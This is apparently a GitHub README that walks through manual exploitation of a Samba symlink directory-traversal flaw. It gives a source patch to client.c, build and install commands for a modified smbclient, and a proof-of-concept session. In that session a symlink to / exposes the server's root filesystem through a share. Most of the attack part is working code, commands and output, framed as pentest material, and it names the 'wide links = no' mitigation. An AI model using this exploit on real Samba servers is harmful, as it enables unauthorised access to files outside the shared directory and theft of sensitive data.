# Symlink-Directory-Traversal-smb-manually


SAMBA Symlink Directory Traversal Manual Exploitation

### Introduction 

Samba is prone to a directory-traversal vulnerability because the application fails to sufficiently sanitize user-supplied input, Exploits would allow an attacker to access files outside of the Samba user's 	root directory to obtain sensitive information and perform other attacks.
Administrators should be careful and set 'wide links = no' in the '[global]' section of 'smb.conf.
 
A proof of concept of Symlink Directory Traversal on Samba, here i will explain how to install the smbclient on an external location to use for the exploitation and also what to change.

The original Manually exploitation explained in the link ( https://www.exploit-db.com/exploits/33599) doesn't work without adding an other code line in the client.c

### First step

We have to download a samba source code from the forge, i used the version 3.4.5, here you can find the download link ( https://download.samba.org/pub/samba/stable/)

```
$ tar -xvzf samba-3.4.5.tar.gz
$ cd samba-3.4.5/source3/client/
```
	

### Modification of client.c

You have to modify this file like in the url  ( https://www.exploit-db.com/exploits/33599) and also adding the line like below :

*************
	targetname = talloc_asprintf(ctx,"%s",buf);   // Add this to remove the prepending //host/share 
	if (!cli_unix_symlink(targetcli, targetname, newname)) {
		d_printf("%s symlinking files (%s -> %s)\n",
			cli_errstr(targetcli), newname, targetname);
		return 1;
	}
**********************
You can show the client.c symlink section after modification in the screen below.
Save it , and you have to install the package.

### Install Package externally to use for your pentest tests

In my case i want to use this  smb client modified version just for my pentest tests, so the idea is to install it in a directory instead of a global installation.

We will use the configure file to create our Makefile with the dir installation location like :
```
$ cd samba-3.4.5/source3/
$ ./configure --prefix=/path/to/destination/directory/installation
$ make && make install
$ cd /path/to/destination/directory/installation/bin
```

We have to specify the library location in our bash env like :

```
$ export LD_LIBRARY_PATH="/path/to/destination/directory/installation/lib:$LD_LIBRARY_PATH"
```
And finnaly run smbclent :

```
$ ./smbclient //192.169.1.12/Share_Name -N

```
### Proof of concept

```
$ ./smbclient //192.169.1.12/Share_Name -N

smb: \> posix
Server supports CIFS extensions 1.0
Server supports CIFS capabilities acls pathnames
smb: \> ls
  .                                   D        0  Sun Jan 13 15:13:58 2019
  ..                                  D        0  Sun Jan 13 15:14:18 2019
		61335 blocks of size 131072. 50251 blocks available

smb: /> symlink / rootfs
smb: /> ls
  .                                   D        0  Sun Jan 13 15:54:10 2019
  ..                                  D        0  Sun Jan 13 15:14:18 2019
  rootfs                              D        0  Wed Aug 26 11:54:18 2009

		61335 blocks of size 131072. 50251 blocks available
smb: /> cd rootfs/
smb: /rootfs/> ls
  .                                   D        0  Wed Aug 26 11:54:18 2009
  ..                                  D        0  Wed Aug 26 11:54:18 2009
  cdrom                               D        0  Thu Sep  6 01:43:19 2007
  var                                 D        0  Thu Sep  6 01:45:53 2007
  selinux                             D        0  Wed Mar  7 23:56:09 2007
  home

```

